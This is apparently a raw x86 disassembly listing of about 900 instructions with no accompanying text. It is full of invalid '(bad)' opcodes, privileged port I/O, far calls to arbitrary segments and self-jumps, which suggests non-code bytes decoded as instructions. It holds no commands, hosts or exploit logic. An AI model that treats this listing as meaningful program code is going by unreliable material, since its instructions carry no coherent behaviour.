  42bab5:	call   0x176d:0x81889b6c
  42babc:	and    al,0x18
  42babe:	pop    ds
  42babf:	fs es ret 0x3022
  42bac4:	pop    ecx
  42bac5:	ins    DWORD PTR es:[edi],dx
  42bac6:	push   ecx
  42bac7:	inc    ebp
  42bac8:	popf   
  42bac9:	jo     0x42bac9
  42bacb:	shr    DWORD PTR es:[eax-0x3fdab00c],cl
  42bad2:	ins    DWORD PTR es:[edi],dx
  42bad3:	sbb    al,0x6c
  42bad5:	(bad)  
  42bad6:	mov    dh,0x40
  42bad8:	inc    edi
  42bad9:	xlat   BYTE PTR ds:[ebx]
  42bada:	dec    ecx
  42badb:	push   cs
  42badc:	push   edx
  42badd:	outs   dx,BYTE PTR ds:[esi]
  42bade:	xlat   BYTE PTR ds:[ebx]
  42badf:	xor    cl,dl
  42bae1:	push   0xfc889144
  42bae6:	or     al,al
  42bae8:	lods   al,BYTE PTR ds:[esi]
  42bae9:	lock mov dh,0x19
  42baec:	adc    DWORD PTR ds:[edx],ebx
  42baef:	(bad)  
  42baf0:	lods   al,BYTE PTR ds:[esi]
  42baf1:	es sbb cl,0xd6
  42baf5:	out    dx,al
  42baf6:	sbb    eax,0x51ac7a50
  42bafb:	nop
  42bafc:	sbb    dl,BYTE PTR [eax]
  42bafe:	cmp    BYTE PTR [eax+ecx*2+0x655a2ad],ch
  42bb05:	(bad)  
  42bb06:	or     al,0x67
  42bb08:	shl    cl,1
  42bb0a:	cmp    ah,BYTE PTR [ecx+0x4b]
  42bb0d:	outs   dx,DWORD PTR ds:[esi]
  42bb0e:	lods   eax,DWORD PTR ds:[esi]
  42bb0f:	push   eax
  42bb10:	mov    esi,0x2a3493be
  42bb15:	pop    ds
  42bb16:	push   es
  42bb17:	push   ss
  42bb18:	adc    al,0xc6
  42bb1a:	stc    
  42bb1b:	dec    eax
  42bb1c:	mov    edx,DWORD PTR [ebp-0x34]
  42bb1f:	jmp    0x42bb1b
  42bb21:	dec    esp
  42bb22:	ins    BYTE PTR es:[edi],dx
  42bb23:	or     eax,0x573a7226
  42bb28:	inc    eax
  42bb29:	into   
  42bb2a:	call   DWORD PTR [edi]
  42bb2c:	push   ecx
  42bb2d:	sub    ah,dl
  42bb2f:	fnstcw WORD PTR [edx+0x668a5ae9]
  42bb35:	push   eax
  42bb36:	xchg   edi,eax
  42bb37:	and    al,0x62
  42bb39:	aad    0xa4
  42bb3b:	sbb    al,0x84
  42bb3d:	shl    BYTE PTR [esi-0x5b7fecf6],1
  42bb43:	(bad)  
  42bb44:	(bad)  
  42bb45:	das    
  42bb46:	jbe    0x42bb19
  42bb48:	sub    dl,BYTE PTR [esi-0x4c]
  42bb4b:	xchg   esi,eax
  42bb4c:	adc    BYTE PTR [ecx-0x36],cl
  42bb4f:	mov    edx,0x46793a7e
  42bb54:	inc    esp
  42bb55:	xchg   BYTE PTR [esi+0x7a00d326],dh
  42bb5b:	mov    dl,0xec
  42bb5d:	xor    al,0xcc
  42bb5f:	enter  0xad00,0x91
  42bb63:	cmp    BYTE PTR [eax],dl
  42bb65:	jecxz  0x42bbc7
  42bb67:	jno    0x42bb7f
  42bb69:	test   BYTE PTR [ebp-0x15f02f29],0x7b
  42bb70:	jns    0x42bb2e
  42bb72:	lea    ebx,[esi-0x75ef533]
  42bb78:	mov    esi,0x20167356
  42bb7d:	push   ss
  42bb7e:	mov    al,ds:0x8e0a8122
  42bb83:	lods   eax,DWORD PTR ds:[esi]
  42bb84:	adc    eax,0xaccbd470
  42bb89:	xor    ch,BYTE PTR [ebx+eax*2+0x2b]
  42bb8d:	sub    bh,BYTE PTR [edx]
  42bb8f:	or     bl,BYTE PTR [ebx+ecx*8-0xc65abfa]
  42bb96:	lods   al,BYTE PTR ds:[esi]
  42bb97:	gs inc edx
  42bb99:	ss adc al,0x5d
  42bb9c:	inc    ecx
  42bb9d:	push   ss
  42bb9e:	jb     0x42bc02
  42bba0:	mov    esp,ss
  42bba2:	nop
  42bba3:	fwait
  42bba4:	sbb    eax,0xb2cab056
  42bba9:	(bad)  
  42bbaa:	jbe    0x42bbde
  42bbac:	push   ds
  42bbad:	popa   
  42bbae:	jbe    0x42bb9a
  42bbb0:	aas    
  42bbb1:	clc    
  42bbb2:	or     al,0x2d
  42bbb4:	push   0x34
  42bbb6:	call   0x544c8cd5
  42bbbb:	pop    eax
  42bbbc:	dec    edx
  42bbbd:	lods   eax,DWORD PTR ds:[esi]
  42bbbe:	test   al,0x5d
  42bbc0:	push   ebx
  42bbc1:	adc    dh,ch
  42bbc3:	mov    eax,0xcad3e04c
  42bbc8:	ins    DWORD PTR es:[edi],dx
  42bbc9:	popa   
  42bbca:	push   ebx
  42bbcb:	xchg   ebx,eax
  42bbcc:	inc    ecx
  42bbcd:	es mov eax,0xfc3658eb
  42bbd3:	mov    ah,0x14
  42bbd5:	inc    edx
  42bbd6:	xchg   edi,eax
  42bbd7:	push   0x2662a214
  42bbdc:	adc    dl,al
  42bbde:	push   esp
  42bbdf:	mov    dh,0xb8
  42bbe1:	imul   DWORD PTR [esp+esi*8-0x2565979c]
  42bbe8:	test   eax,0x3af6d62b
  42bbed:	popf   
  42bbee:	sti    
  42bbef:	push   cs
  42bbf0:	inc    eax
  42bbf1:	fcmovnbe st,st(0)
  42bbf3:	rol    DWORD PTR [eax+ebx*1],1
  42bbf6:	dec    eax
  42bbf7:	jnp    0x42bbe5
  42bbf9:	pop    ss
  42bbfa:	pop    ebx
  42bbfb:	xchg   esp,eax
  42bbfc:	or     BYTE PTR [eax+ebp*8-0x6c],ch
  42bc00:	pop    esi
  42bc01:	jl     0x42bc5b
  42bc03:	es mov dh,0x41
  42bc06:	mov    esi,0x1c03012f
  42bc0c:	call   0x5f1d:0xaa8755cf
  42bc13:	pop    eax
  42bc14:	push   esi
  42bc15:	jb     0x42bbb8
  42bc17:	clc    
  42bc18:	int3   
  42bc19:	mov    DWORD PTR [edi],ecx
  42bc1b:	pusha  
  42bc1c:	sub    DWORD PTR [eax+0x53],0xbf511072
  42bc23:	add    ch,BYTE PTR [ecx+ebx*2-0x77]
  42bc27:	inc    ecx
  42bc28:	mov    al,ds:0xdc24bcca
  42bc2d:	add    BYTE PTR [ebp+0x75],dh
  42bc30:	jb     0x42bc32
  42bc32:	mov    al,ds:0x3e5440a8
  42bc37:	out    0xd4,eax
  42bc39:	sub    bl,BYTE PTR [edx+0x3e]
  42bc3c:	fadd   QWORD PTR [ecx*1+0x52fcc552]
  42bc43:	enter  0x5d1a,0x7e
  42bc47:	arpl   WORD PTR [edx],cx
  42bc49:	sbb    ebx,DWORD PTR [edx]
  42bc4b:	cmp    BYTE PTR [esi],dl
  42bc4d:	stos   BYTE PTR es:[edi],al
  42bc4e:	bswap  ebp
  42bc50:	neg    BYTE PTR [edx]
  42bc52:	shl    DWORD PTR ss:[esi+0x5a31701a],1
  42bc59:	and    al,ch
  42bc5b:	push   ss
  42bc5c:	cmp    eax,edx
  42bc5e:	jle    0x42bcb0
  42bc60:	sbb    ch,BYTE PTR [edx]
  42bc62:	retf   0x1a0a
  42bc65:	jl     0x42bbea
  42bc67:	xchg   edx,eax
  42bc68:	lods   eax,DWORD PTR ds:[esi]
  42bc69:	push   0x83ad4a4
  42bc6e:	ja     0x42bc5e
  42bc70:	cs jnp 0x42bcd3
  42bc73:	mov    eax,ds:0x82fe0e62
  42bc78:	inc    ebp
  42bc79:	mov    eax,0xd6c70abc
  42bc7e:	lock inc esi
  42bc80:	cmp    al,BYTE PTR [eax]
  42bc82:	xor    eax,DWORD PTR [edi+eax*2-0x3c]
  42bc86:	sub    BYTE PTR [eax],bl
  42bc88:	sub    BYTE PTR ss:[esi],cl
  42bc8b:	call   0x245c7d68
  42bc90:	ss in  al,dx
  42bc92:	add    al,0x60
  42bc94:	imul   ebx,DWORD PTR ds:0x61e0655,0xffffff8d
  42bc9b:	adc    BYTE PTR [esp+ebx*1],dl
  42bc9e:	fwait
  42bc9f:	inc    edx
  42bca0:	in     eax,0x2a
  42bca2:	cli    
  42bca3:	or     DWORD PTR [ecx+eiz*1],esi
  42bca6:	outs   dx,BYTE PTR ds:[esi]
  42bca7:	pusha  
  42bca8:	jmp    0x42bc84
  42bcaa:	aas    
  42bcab:	push   es
  42bcac:	mov    al,0xe1
  42bcae:	out    0x98,al
  42bcb0:	adc    edi,DWORD PTR [ebp+0x18]
  42bcb3:	pop    edi
  42bcb4:	add    BYTE PTR gs:[edx-0x48eaff4b],bl
  42bcbb:	cmp    dl,ah
  42bcbd:	sbb    DWORD PTR [eax],eax
  42bcbf:	mov    dh,0x7c
  42bcc1:	jns    0x42bccd
  42bcc3:	and    BYTE PTR [ebp+esi*4+0x2497e167],ah
  42bcca:	inc    eax
  42bccb:	fnstsw WORD PTR [eax+0x22]
  42bcce:	mov    dl,0x7f
  42bcd0:	lock push cs
  42bcd2:	adc    BYTE PTR [ebp-0x70f58766],ch
  42bcd8:	and    bh,dh
  42bcda:	add    bl,al
  42bcdc:	cmp    DWORD PTR [edi-0x49],edx
  42bcdf:	je     0x42bc87
  42bce1:	push   0xa2565418
  42bce6:	ror    DWORD PTR [ebx],1
  42bce8:	pusha  
  42bce9:	xor    eax,0xdb5112b8
  42bcee:	vmwrite eax,DWORD PTR [ecx+0x6d]
  42bcf2:	adc    eax,0x729188b6
  42bcf7:	inc    esi
  42bcf8:	jbe    0x42bccb
  42bcfa:	call   0x75a1:0x3402b2e3
  42bd01:	dec    esi
  42bd02:	call   0x1c8d9951
  42bd07:	xchg   BYTE PTR [edx],cl
  42bd09:	xlat   BYTE PTR ds:[ebx]
  42bd0a:	and    BYTE PTR [edi-0x735fd1ee],0x4c
  42bd11:	cmp    eax,0x3c078292
  42bd16:	ret    0x295a
  42bd19:	shl    ch,cl
  42bd1b:	or     al,0x3c
  42bd1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd1e:	not    BYTE PTR [esi]
  42bd20:	xor    al,0xc1
  42bd22:	mov    ?,WORD PTR [ebp+0x6]
  42bd25:	lds    esp,FWORD PTR [edx+0x54]
  42bd28:	pop    eax
  42bd29:	test   DWORD PTR [esi],ebx
  42bd2b:	sub    eax,0xfa2b68b6
  42bd30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd31:	cmp    BYTE PTR [edi+0x5f94e76e],bl
  42bd37:	scas   eax,DWORD PTR es:[edi]
  42bd38:	push   esi
  42bd39:	add    BYTE PTR ds:0x48b24a9a,al
  42bd3f:	ficom  DWORD PTR [edx-0x25]
  42bd42:	inc    eax
  42bd43:	mov    eax,ds:0x11b555a1
  42bd48:	and    bl,BYTE PTR [edx]
  42bd4a:	test   BYTE PTR [ebp-0x6f910cf6],0x56
  42bd51:	or     BYTE PTR [eax-0x4f],al
  42bd54:	sahf   
  42bd55:	xchg   ecx,ebx
  42bd57:	les    edi,FWORD PTR [eax+ebx*1-0x24]
  42bd5b:	stos   BYTE PTR es:[edi],al
  42bd5c:	add    DWORD PTR [esp+ecx*4+0x18dc28c8],ecx
  42bd63:	mov    al,0xe6
  42bd65:	sub    ebx,DWORD PTR [edx]
  42bd67:	dec    edx
  42bd68:	adc    dl,bh
  42bd6a:	(bad)  
  42bd6c:	add    dh,dl
  42bd6e:	fnstsw WORD PTR [ebx]
  42bd70:	inc    eax
  42bd71:	inc    ecx
  42bd72:	sub    eax,0x50d005b0
  42bd77:	or     edi,DWORD PTR [esp+eiz*8+0x4b]
  42bd7b:	nop
  42bd7c:	mov    bh,0x1
  42bd7e:	fcomi  st,st(0)
  42bd80:	add    dl,BYTE PTR [edx]
  42bd82:	push   eax
  42bd83:	int    0xd4
  42bd85:	mov    dl,0x66
  42bd87:	and    eax,0x7c293701
  42bd8c:	xchg   esi,eax
  42bd8d:	mov    dh,0xa
  42bd8f:	aad    0x6
  42bd91:	mov    dh,0xa4
  42bd93:	push   0xffffffea
  42bd95:	pop    esi
  42bd96:	inc    edi
  42bd97:	sbb    al,0x35
  42bd99:	mov    ecx,0x21db4c3b
  42bd9e:	sub    al,0x5
  42bda0:	dec    esp
  42bda1:	enter  0x7ca7,0x96
  42bda5:	mov    al,ds:0x828569b3
  42bdaa:	xor    dh,dh
  42bdac:	sbb    al,0x7b
  42bdae:	sbb    eax,0x67b60417
  42bdb3:	ficomp DWORD PTR [edi]
  42bdb5:	les    edx,FWORD PTR [esi+0x9e186db]
  42bdbb:	mov    al,0x66
  42bdbd:	add    BYTE PTR [esi],cl
  42bdbf:	cmp    DWORD PTR [ecx+eax*8-0x3beab60a],ebp
  42bdc6:	int3   
  42bdc7:	dec    eax
  42bdc8:	jmp    0x18f89b07
  42bdcd:	xchg   BYTE PTR [esi+0x5e94005a],ah
  42bdd3:	aad    0x54
  42bdd5:	jbe    0x42bda4
  42bdd7:	pop    esp
  42bdd8:	outs   dx,DWORD PTR ds:[esi]
  42bdd9:	cmp    eax,0x52b4b604
  42bdde:	inc    edx
  42bddf:	xchg   edx,eax
  42bde0:	fisubr WORD PTR [edx-0x44]
  42bde3:	ins    BYTE PTR es:[edi],dx
  42bde4:	lods   al,BYTE PTR ds:[esi]
  42bde5:	push   ebp
  42bde6:	push   edi
  42bde7:	shl    BYTE PTR [ecx],cl
  42bde9:	fld    TBYTE PTR [esi+0x554f5aff]
  42bdef:	xor    eax,0xc82ed05b
  42bdf4:	push   ebp
  42bdf5:	push   0x6
  42bdf7:	nop
  42bdf8:	out    dx,eax
  42bdf9:	sbb    DWORD PTR [edx],esp
  42bdfb:	retf   0x7819
  42bdfe:	adc    al,0x76
  42be01:	(bad)  
  42be02:	cmc    
  42be03:	mov    edi,0xcb0af4c4
  42be08:	push   0x15
  42be0a:	dec    ebp
  42be0b:	sub    ebx,DWORD PTR [eax]
  42be0d:	pop    edi
  42be0e:	call   0x4716:0xb5c45bb1
  42be15:	pop    edx
  42be16:	inc    edi
  42be17:	xchg   DWORD PTR [eax+0x30433606],edx
  42be1d:	lods   eax,DWORD PTR ds:[esi]
  42be1e:	inc    esi
  42be1f:	dec    edi
  42be20:	push   ebp
  42be21:	xchg   edi,eax
  42be22:	push   0x309ae236
  42be27:	int    0x96
  42be29:	repnz push ecx
  42be2b:	jae    0x42be77
  42be2d:	dec    ebp
  42be2e:	pop    eax
  42be2f:	sbb    al,0xd0
  42be31:	jbe    0x42be6b
  42be33:	mov    al,0x3
  42be35:	or     eax,0xd7ae6b80
  42be3a:	or     bl,BYTE PTR ds:[ebx+0x6c]
  42be3e:	shl    BYTE PTR [eax],1
  42be40:	jl     0x42be74
  42be42:	lahf   
  42be43:	and    al,0x28
  42be45:	mov    ds:0x82c2c9f8,eax
  42be4a:	pop    edx
  42be4b:	jb     0x42bdd1
  42be4d:	sbb    BYTE PTR [edx+0x6f],0x62
  42be51:	xchg   esi,esi
  42be53:	ss mov eax,0x1deb3c0c
  42be59:	mov    dh,0xa8
  42be5b:	mov    al,ds:0xa5bbd43e
  42be60:	hlt    
  42be61:	mov    edx,0x8300991d
  42be66:	pop    ss
  42be67:	aam    0xe
  42be69:	mov    ah,0x3e
  42be6b:	xor    edi,DWORD PTR [ecx-0x7fd15a76]
  42be71:	rol    BYTE PTR [edx-0x21d3a396],0x31
  42be78:	add    al,ah
  42be7a:	es sbb al,0x54
  42be7d:	pop    eax
  42be7e:	sbb    eax,0xb49e0b0e
  42be83:	and    BYTE PTR [edx+0x1c15702d],al
  42be89:	xor    ecx,DWORD PTR [eax+esi*1+0xbca527f]
  42be90:	ds push eax
  42be92:	test   al,0xc4
  42be94:	xchg   ebp,eax
  42be95:	add    ch,bl
  42be97:	jp     0x42bed5
  42be99:	mov    cl,0x0
  42be9b:	add    BYTE PTR [ebx+0x67efcc2a],cl
  42bea1:	loop   0x42be86
  42bea3:	xchg   BYTE PTR ds:0x593c5511,dh
  42bea9:	fwait
  42beaa:	les    esp,FWORD PTR [esi-0x27d9a990]
  42beb0:	inc    eax
  42beb1:	cs mov esp,0x703445c9
  42beb7:	ins    BYTE PTR es:[edi],dx
  42beb8:	or     ah,al
  42beba:	xchg   ebp,eax
  42bebb:	add    BYTE PTR fs:[edx-0x2e2f2e26],bl
  42bec2:	xor    al,0xfc
  42bec4:	sub    DWORD PTR [eax],ecx
  42bec6:	out    dx,al
  42bec7:	(bad)  
  42bec8:	fisttp WORD PTR [eax]
  42beca:	aam    0xb5
  42becc:	call   0x145ea121
  42bed1:	imul   eax,DWORD PTR [edx+esi*1+0x13e3a6d2],0x54
  42bed9:	push   eax
  42beda:	push   ds
  42bedb:	outs   dx,BYTE PTR ds:[esi]
  42bedc:	dec    ebx
  42bedd:	dec    edi
  42bede:	nop
  42bedf:	or     DWORD PTR [edx+0x24],edi
  42bee2:	xor    eax,0xe7e0449
  42bee7:	stc    
  42bee8:	(bad)  
  42bee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42beea:	(bad)  
  42beeb:	rcl    BYTE PTR [eax+0x47aa1a7e],0x41
  42bef2:	stos   BYTE PTR es:[edi],al
  42bef3:	sub    ch,BYTE PTR [edi+eax*2+0x16]
  42bef7:	xchg   esi,eax
  42bef8:	jge    0x42beef
  42befa:	cmp    al,BYTE PTR [esi-0x79]
  42befd:	scas   al,BYTE PTR es:[edi]
  42befe:	nop
  42beff:	push   eax
  42bf00:	pusha  
  42bf01:	cmp    ebp,DWORD PTR [edx-0x2175c0d6]
  42bf07:	sbb    al,0x3a
  42bf09:	xor    cx,bp
  42bf0c:	ret    0x56c2
  42bf0f:	pop    edx
  42bf10:	push   0x1c
  42bf12:	cdq    
  42bf13:	push   esi
  42bf14:	nop
  42bf15:	cmp    ebp,DWORD PTR [edx-0x25b5b4ae]
  42bf1b:	mov    al,ds:0xad685a54
  42bf20:	imul   ebp,DWORD PTR [eax-0x593d106a],0xf4531ca4
  42bf2a:	loope  0x42beff
  42bf2c:	adc    bl,BYTE PTR [eax+0x68]
  42bf2f:	jp     0x42bf05
  42bf31:	push   esi
  42bf32:	pop    eax
  42bf33:	aam    0x5c
  42bf35:	add    BYTE PTR [esi-0x49a6ddee],0xdd
  42bf3c:	adc    eax,0xf4dfad9e
  42bf42:	mul    ecx
  42bf44:	ss (bad) 
  42bf46:	fdiv   QWORD PTR [ecx+0x58135e0a]
  42bf4c:	jb     0x42bef5
  42bf4e:	adc    eax,0x66f78220
  42bf53:	(bad)  
  42bf54:	sub    al,0x68
  42bf56:	mov    eax,0x86a4cca6
  42bf5b:	and    edi,DWORD PTR [esi+0x4e]
  42bf5e:	cmp    al,0x60
  42bf60:	(bad)  
  42bf61:	mov    cl,0xd5
  42bf63:	imul   ebp,DWORD PTR [eax],0x26
  42bf66:	push   esp
  42bf67:	dec    ecx
  42bf68:	out    dx,eax
  42bf69:	sub    dl,BYTE PTR [eax+0x19]
  42bf6c:	mov    eax,0x6e008dfc
  42bf71:	mov    bh,BYTE PTR [esi+0x4d]
  42bf74:	stos   BYTE PTR es:[edi],al
  42bf75:	xor    ch,BYTE PTR [edx+ebp*8]
  42bf78:	push   cs
  42bf79:	sti    
  42bf7a:	and    BYTE PTR [edx],al
  42bf7c:	mov    ds:0x85724608,al
  42bf81:	call   0x2823:0x876e2c52
  42bf88:	or     al,0xca
  42bf8a:	jo     0x42bfac
  42bf8c:	bound  eax,QWORD PTR [ebx-0x48]
  42bf8f:	bound  edi,QWORD PTR [ecx]
  42bf91:	(bad)  
  42bf92:	or     al,0x85
  42bf94:	push   ebx
  42bf95:	pop    ebx
  42bf96:	push   eax
  42bf97:	push   ebp
  42bf98:	ss inc edx
  42bf9a:	jmp    0x8b8e:0x5560bac3
  42bfa1:	fs ffreep st(6)
  42bfa4:	push   es
  42bfa5:	push   ebp
  42bfa6:	xchg   esp,esp
  42bfa8:	bound  ecx,QWORD PTR [eax+0x6c]
  42bfab:	aam    0xee
  42bfad:	fadd   DWORD PTR [esp+ecx*1-0x77]
  42bfb1:	dec    eax
  42bfb2:	retf   0xa964
  42bfb5:	pop    edi
  42bfb6:	stos   BYTE PTR es:[edi],al
  42bfb7:	mov    ds:0x54268be1,al
  42bfbc:	and    ah,cl
  42bfbe:	and    dh,BYTE PTR [eax+0x10]
  42bfc1:	ins    BYTE PTR es:[edi],dx
  42bfc2:	pop    ebp
  42bfc3:	lods   eax,DWORD PTR ds:[esi]
  42bfc4:	data16 mov al,0x1c
  42bfc7:	leave  
  42bfc8:	dec    edx
  42bfc9:	or     edx,DWORD PTR [edx-0x3c]
  42bfcc:	sbb    eax,0x52
  42bfcf:	inc    edi
  42bfd0:	add    DWORD PTR [ecx-0x10],0x3e
  42bfd4:	sub    al,0x2a
  42bfd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bfd7:	mov    eax,ds:0x2a056450
  42bfdc:	xchg   ebx,eax
  42bfdd:	sar    BYTE PTR [esi],1
  42bfdf:	mov    bh,BYTE PTR [eax]
  42bfe1:	or     eax,0x94508fa2
  42bfe6:	xor    al,0xb5
  42bfe8:	sbb    bl,BYTE PTR [esi-0x38b8d786]
  42bfee:	or     DWORD PTR [eax+0x1251966b],0xdac1aef0
  42bff8:	call   0x6328:0x859ca68
  42bfff:	mov    ?,WORD PTR [esi-0x6987d22e]
  42c005:	lock ss popf 
  42c008:	call   0xdf48ca73
  42c00d:	xchg   ebp,eax
  42c00e:	inc    ecx
  42c00f:	xchg   ebx,eax
  42c010:	add    BYTE PTR [edx+0x43ee061c],0xa8
  42c017:	sbb    al,0x8b
  42c019:	ficomp WORD PTR [edx-0x22]
  42c01c:	jl     0x42c00b
  42c01e:	mov    esi,0x7a000d20
  42c023:	inc    esp
  42c024:	jae    0x42bfe7
  42c026:	pusha  
  42c027:	loopne 0x42c07c
  42c029:	ins    DWORD PTR es:[edi],dx
  42c02a:	add    DWORD PTR [eax+ebp*2],esi
  42c02d:	int3   
  42c02e:	pop    esi
  42c02f:	pop    ss
  42c030:	cs imul eax,ebx,0x60a949d1
  42c037:	sti    
  42c038:	(bad)  
  42c039:	shl    DWORD PTR [edx-0x4fb4b5ab],cl
  42c03f:	inc    edx
  42c040:	cdq    
  42c041:	dec    esi
  42c042:	pop    edx
  42c043:	ins    BYTE PTR es:[edi],dx
  42c044:	jb     0x42c07f
  42c046:	mov    edx,0x34f481ad
  42c04b:	add    BYTE PTR [esi+ebx*8+0xaa2be2a],cl
  42c052:	or     ah,BYTE PTR [eax+0x2b]
  42c055:	xor    al,0xdb
  42c057:	fadd   DWORD PTR [eax+ebp*1]
  42c05a:	jmp    0xa16:0xdcba840c
  42c061:	lock ret 0xfe44
  42c065:	or     DWORD PTR [eax+0x141a9da2],esi
  42c06b:	fnstsw WORD PTR [edx+eiz*1+0x3f]
  42c06f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c070:	add    ah,ah
  42c072:	pusha  
  42c073:	dec    eax
  42c074:	cmp    al,0x90
  42c076:	dec    esp
  42c077:	mov    edi,0xc002107f
  42c07c:	add    dh,BYTE PTR [edx+ebx*2]
  42c07f:	dec    ebx
  42c080:	inc    esi
  42c081:	mov    edx,0xcdb52d64
  42c086:	lock or ch,BYTE PTR [esi+0x58]
  42c08a:	push   cs
  42c08b:	mov    dl,0x54
  42c08d:	(bad)  
  42c08e:	cmp    bh,ch
  42c090:	push   eax
  42c091:	fs es lock js 0x42c09f
  42c096:	ror    BYTE PTR [edx-0x57],0xda
  42c09a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c09b:	add    BYTE PTR [eax+0x18],dl
  42c09e:	mov    ds:0x1f9e8e16,eax
  42c0a3:	inc    esi
  42c0a4:	lds    ecx,FWORD PTR [edx-0x1dd5ebe9]
  42c0aa:	push   eax
  42c0ab:	dec    esp
  42c0ac:	xchg   esi,eax
  42c0ad:	retf   0x47a6
  42c0b0:	(bad)  
  42c0b1:	das    
  42c0b2:	ins    DWORD PTR es:[edi],dx
  42c0b3:	sub    dh,dl
  42c0b5:	mov    al,0xaa
  42c0b7:	inc    ebx
  42c0b8:	mov    ds:0x6b55c93c,eax
  42c0bd:	or     eax,0x29c0e0d
  42c0c2:	stc    
  42c0c3:	call   0x24f:0xa2edb89f
  42c0ca:	lea    eax,[esp+edi*8+0x6]
  42c0ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c0cf:	out    0x2,al
  42c0d1:	inc    ecx
  42c0d2:	(bad)  
  42c0d3:	mov    gs,WORD PTR [ebx]
  42c0d5:	cmp    ax,0x602e
  42c0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0da:	push   es
  42c0db:	mov    dh,BYTE PTR [ebp+0x26b6d1cb]
  42c0e1:	lods   al,BYTE PTR ds:[esi]
  42c0e2:	fld    TBYTE PTR [ebp-0x7f39f90]
  42c0e8:	repnz mov ebx,0xd44b2eb3
  42c0ee:	mov    dh,0x9f
  42c0f0:	je     0x42c170
  42c0f2:	mov    esp,0xdb00eeb2
  42c0f7:	pop    edx
  42c0f8:	push   ebp
  42c0f9:	dec    esp
  42c0fa:	dec    esi
  42c0fb:	sub    eax,0x249ad410
  42c100:	or     al,0x16
  42c102:	cwde   
  42c103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c104:	push   es
  42c105:	xchg   DWORD PTR [edx+eiz*2+0x2d84fe58],ecx
  42c10c:	push   ss
  42c10d:	xor    al,0xfe
  42c10f:	mov    DWORD PTR [edx+0x376b4783],edi
  42c115:	mov    dh,0x60
  42c117:	inc    edi
  42c118:	aad    0x95
  42c11a:	push   ss
  42c11b:	add    al,0x96
  42c11d:	cmp    DWORD PTR [esi+0x7d],esp
  42c120:	inc    esi
  42c121:	sub    dh,BYTE PTR [esi-0x79ab5cfd]
  42c127:	xor    ch,BYTE PTR [ebx]
  42c129:	adc    BYTE PTR [ebx],cl
  42c12b:	rcr    BYTE PTR [edx+ebx*2],0xa2
  42c12f:	mov    ch,0xad
  42c131:	retf   0x1258
  42c134:	enter  0x402e,0x4f
  42c138:	call   0x661:0x51f14005
  42c13f:	lods   al,BYTE PTR ds:[esi]
  42c140:	adc    dh,ah
  42c142:	cmp    BYTE PTR cs:[esi+0x1900d6b5],0x55
  42c14a:	push   ss
  42c14b:	xchg   esp,eax
  42c14c:	cld    
  42c14d:	pushf  
  42c14e:	jle    0x42c10e
  42c150:	lods   eax,DWORD PTR ds:[esi]
  42c151:	sub    ch,BYTE PTR [eax-0x72]
  42c154:	mov    dh,BYTE PTR [esp+edx*4-0x33b6b1a2]
  42c15b:	jns    0x42c183
  42c15d:	inc    edx
  42c15e:	inc    edi
  42c15f:	inc    ebx
  42c160:	xchg   DWORD PTR [edx+edi*4+0x9],esp
  42c164:	add    al,BYTE PTR [edx]
  42c166:	test   BYTE PTR ss:[ebx+ebx*2],0x81
  42c16b:	shl    DWORD PTR [eax-0x52],0xb9
  42c16f:	out    dx,al
  42c170:	xchg   ebp,eax
  42c171:	xchg   ecx,eax
  42c172:	sbb    dh,BYTE PTR [esi+eax*4+0x4858d6a6]
  42c179:	push   0xffffff9e
  42c17b:	push   0xfffffff5
  42c17d:	dec    edx
  42c17e:	mov    edx,0x1586ad58
  42c183:	push   esi
  42c184:	add    al,ah
  42c186:	sbb    ah,0xf4
  42c189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c18a:	mov    gs,WORD PTR [edx+0x5d6b3082]
  42c190:	xchg   BYTE PTR [esi+0x5004ae16],dl
  42c196:	test   BYTE PTR [esi+0x9],dl
  42c199:	cmp    eax,0xd5c6410a
  42c19e:	pop    esi
  42c19f:	or     ebx,DWORD PTR [ecx+0x6ab1c142]
  42c1a5:	pop    ds
  42c1a6:	scas   al,BYTE PTR es:[edi]
  42c1a7:	(bad)  
  42c1a8:	ror    DWORD PTR [edx],1
  42c1aa:	inc    esp
  42c1ab:	fwait
  42c1ac:	outs   dx,BYTE PTR ds:[esi]
  42c1ad:	(bad)  
  42c1ae:	test   bh,ah
  42c1b0:	es data16 daa 
  42c1b3:	call   0x8e58:0x26b6d1e6
  42c1ba:	ja     0x42c1dc
  42c1bc:	push   ds
  42c1bd:	sub    BYTE PTR ds:0x1c94724c,al
  42c1c3:	je     0x42c20e
  42c1c5:	lods   al,BYTE PTR ds:[esi]
  42c1c6:	clc    
  42c1c7:	push   es
  42c1c8:	loop   0x42c183
  42c1ca:	mov    BYTE PTR [ecx+0x7068ecb],cl
  42c1d0:	cmc    
  42c1d1:	sub    ch,0x92
  42c1d4:	inc    esp
  42c1d5:	out    0x8a,eax
  42c1d7:	add    eax,0x8d86c45f
  42c1dc:	add    BYTE PTR [ebx-0x3c],0x92
  42c1e0:	xchg   edx,eax
  42c1e1:	mov    edx,0xb226f2f
  42c1e6:	xchg   BYTE PTR [edx+0x3e],al
  42c1e9:	mov    dl,0x4c
  42c1eb:	jg     0x42c265
  42c1ed:	add    BYTE PTR [edi],al
  42c1ef:	sub    eax,0x440d5250
  42c1f4:	sub    al,0x58
  42c1f6:	xor    BYTE PTR [edx-0x5f7fd20e],dh
  42c1fc:	push   ebp
  42c1fd:	mov    ds:0xae2b8296,al
  42c202:	jo     0x42c1d6
  42c204:	cdq    
  42c205:	adc    BYTE PTR [edi+ecx*2-0x58],al
  42c209:	push   ss
  42c20a:	cdq    
  42c20b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c20c:	jle    0x42c223
  42c20e:	add    cl,BYTE PTR [edx]
  42c210:	js     0xee6b58d8
  42c216:	push   0x1f
  42c218:	mov    DWORD PTR [edx-0x5dd30177],esp
  42c21e:	jne    0x42c1d1
  42c220:	cs ret 
  42c222:	jo     0x42c217
  42c224:	in     eax,dx
  42c225:	pop    eax
  42c226:	fcom   st(5)
  42c228:	out    dx,al
  42c229:	cmc    
